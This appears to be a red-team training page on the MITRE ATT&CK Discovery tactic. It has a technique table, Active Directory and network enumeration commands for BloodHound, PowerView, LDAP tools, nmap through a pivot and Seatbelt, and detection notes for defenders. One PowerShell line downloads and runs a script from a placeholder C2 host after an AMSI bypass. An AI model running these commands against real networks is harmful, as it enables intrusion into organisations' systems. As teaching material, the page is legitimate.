---
layout: training-page
title: "TA0007 — Discovery — Red Team Academy"
module: "MITRE ATT&CK Tactics"
tags:
  - mitre
  - att&ck
  - discovery
  - enumeration
  - bloodhound
  - active-directory
page_key: "mitre-ta0007"
render_with_liquid: false
---

# TA0007 — Discovery

Discovery is the post-compromise phase where adversaries learn the environment they've landed in — what systems exist, who the users and admins are, what network segments are reachable, and where the high-value targets are. In Active Directory environments, discovery is typically the most critical phase: a complete picture of the AD structure, trust relationships, and privilege paths is required to execute an efficient attack chain.

Effective discovery generates significant log volume but blends with legitimate IT operations — admins run similar queries every day. The key is knowing which queries reveal attack paths versus which generate noise.

## Key Techniques

| T-ID | Technique | Sub-technique | Notes |
|------|-----------|---------------|-------|
| T1087 | Account Discovery | T1087.001 Local Account | net user; Get-LocalUser |
| T1087 | Account Discovery | T1087.002 Domain Account | net user /domain; Get-ADUser; BloodHound |
| T1087 | Account Discovery | T1087.003 Email Account | GAL enumeration via Exchange/OWA |
| T1087 | Account Discovery | T1087.004 Cloud Account | az ad user list; aws iam list-users |
| T1082 | System Information Discovery | — | systeminfo; Get-ComputerInfo; uname -a |
| T1049 | System Network Connections Discovery | — | netstat -ano; ss -tulnp |
| T1018 | Remote System Discovery | — | net view; arp -a; nmap from pivot |
| T1135 | Network Share Discovery | — | net view \\server; Get-SmbShare |
| T1016 | System Network Configuration Discovery | — | ipconfig /all; ifconfig; route print |
| T1033 | System Owner/User Discovery | — | whoami; id; query user |
| T1069 | Permission Groups Discovery | T1069.001 Local Groups | net localgroup Administrators |
| T1069 | Permission Groups Discovery | T1069.002 Domain Groups | Get-ADGroupMember "Domain Admins" |
| T1069 | Permission Groups Discovery | T1069.003 Cloud Groups | az ad group list |
| T1083 | File and Directory Discovery | — | dir /s /b; Get-ChildItem -Recurse |
| T1046 | Network Service Discovery | — | nmap -sV; masscan from pivot host |
| T1040 | Network Sniffing | — | Wireshark, tcpdump, netsh trace |
| T1057 | Process Discovery | — | tasklist; ps aux; Get-Process |
| T1012 | Query Registry | — | reg query; Get-ItemProperty |
| T1007 | System Service Discovery | — | sc query; Get-Service |
| T1526 | Cloud Service Discovery | — | aws iam list-roles; az resource list |
| T1580 | Cloud Infrastructure Discovery | — | enumerate VPCs, subnets, security groups |
| T1613 | Container and Resource Discovery | — | docker ps; kubectl get pods |
| T1619 | Cloud Storage Object Discovery | — | aws s3 ls; az storage blob list |
| T1538 | Cloud Service Dashboard | — | Enumerate via cloud console access |

## Red Team Tooling

### Active Directory Enumeration (BloodHound)

```
# SharpHound — ingest AD data for BloodHound (runs as domain user)
SharpHound.exe --CollectionMethods All --ZipFilename bloodhound_out.zip
SharpHound.exe --CollectionMethods DCOnly    # DC-only, less noise, less data
SharpHound.exe -c All --Loop --LoopDuration 02:00:00  # continuous collection

# BloodHound.py — remote collection (no agent on endpoint needed)
python3 bloodhound.py -d corp.local -u user -p password -ns DC_IP -c All

# Load ZIP into BloodHound GUI, run pre-built queries:
# "Shortest Paths to Domain Admins"
# "Find all Domain Admin Sessions"
# "Kerberoastable High Value Targets"
# "Shortest Path from Owned Principals"
```

### PowerView (AD Enumeration)

```
# Import PowerView
. .\PowerView.ps1
# Or bypass AMSI first, then import:
IEX (New-Object Net.WebClient).DownloadString('http://C2/PowerView.ps1')

# User and group enumeration
Get-DomainUser | Select samaccountname, description, memberof | Out-File users.txt
Get-DomainGroup -Name "Domain Admins" | Select -ExpandProperty Members
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Computer enumeration
Get-DomainComputer | Select dnshostname, operatingsystem, lastlogondate | Out-File computers.txt

# Trust relationships
Get-DomainTrust | Select SourceName,TargetName,TrustType,TrustDirection

# ACL enumeration — find misconfigured rights
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner"}

# Find local admin access across domain
Find-LocalAdminAccess -Verbose   # noisy — connects to all hosts
Get-NetLocalGroupMember -ComputerName TARGET -GroupName Administrators

# Locate high-value sessions
Find-DomainUserLocation -UserIdentity "Domain Admins"  # where are DA sessions?
```

### LDAP Enumeration

```
# ldapdomaindump — comprehensive AD dump via LDAP
ldapdomaindump -u 'DOMAIN\user' -p 'password' DC_IP -o ldap_dump/

# ldapsearch (from Linux)
ldapsearch -x -h DC_IP -D 'DOMAIN\user' -w 'password' \
  -b 'DC=corp,DC=local' '(objectClass=user)' sAMAccountName mail

# Enum4linux-ng — SMB/LDAP enumeration combined
enum4linux-ng.py -A -v -u user -p password DC_IP
```

### Network Discovery from Pivot

```
# Nmap from compromised host (through Chisel SOCKS)
proxychains nmap -sV -p 22,80,443,445,3389,8080 10.10.10.0/24

# CrackMapExec — SMB host discovery + info
cme smb 10.10.10.0/24 --timeout 5

# NetView — find logged-on users across hosts (noisier)
Invoke-NetView -ComputerName DC01

# Internal port scan via Invoke-Portscan (PowerShell, no binary)
Invoke-Portscan -Hosts 10.10.10.0/24 -Ports "22,80,443,445,3389,8080" -Threads 50
```

### Host Enumeration

```
# Seatbelt — comprehensive local host enumeration (.NET)
Seatbelt.exe -group=all > seatbelt_out.txt
Seatbelt.exe -group=system   # OS, AV, dotnet, hotfixes
Seatbelt.exe -group=user     # tokens, putty sessions, cached creds
Seatbelt.exe -group=misc     # interesting files, cloud metadata

# WMI queries for system info
Get-WMIObject Win32_ComputerSystem | Select Name, Domain, Manufacturer, Model
Get-WMIObject Win32_OperatingSystem | Select Caption, Version, BuildNumber, LastBootUpTime
Get-WMIObject Win32_Product | Select Name, Version   # installed software
Get-HotFix | Sort InstalledOn -Desc | Select HotFixID, InstalledOn | Head 10

# Network connections
netstat -ano | findstr ESTABLISHED
```

## Detection Notes

- **BloodHound/SharpHound collection**: LDAP queries from non-DC machines generate Event ID 1644 (LDAP Diagnostic) on DCs when verbose logging enabled; `net1.exe` child processes from unusual parents; large spike in LDAP requests from single host
- **PowerView**: same LDAP patterns; PowerShell ScriptBlock logging (Event 4104) captures function names like `Get-DomainUser`, `Find-LocalAdminAccess`
- **Network scanning from pivot**: sudden nmap/masscan traffic from compromised internal host detected by IDS/NDR; ARP broadcast storms on local segment
- **Account/share enumeration**: Event ID 4661 (object handle to SAM), 4672 (special privileges assigned) — correlate with unusual source accounts
- **Seatbelt**: .NET assembly execution from unusual path; Process monitoring for Seatbelt patterns (WMI + registry queries in rapid sequence)

## Related Academy Pages

- [AD Enumeration](/active-directory/ad-enumeration/)
- [BloodHound / SharpHound](/active-directory/bloodhound/)
- [Network Enumeration](/recon/network-enum/)
- [Network Scanning & Mapping](/network-attacks/network-scanning/)
- [Seatbelt — Host Enumeration](/post-exploitation/seatbelt/)
- [AD Exploitation Cheat Sheet](/active-directory/ad-exploitation-cheatsheet/)
- [Azure AD Reconnaissance](/active-directory/azure-recon/)

## Resources

- [TA0007 — MITRE ATT&CK Discovery](https://attack.mitre.org/tactics/TA0007/)
- [T1087 — Account Discovery](https://attack.mitre.org/techniques/T1087/)
- [BloodHound Documentation](https://bloodhound.readthedocs.io)
- [PowerView GitHub](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
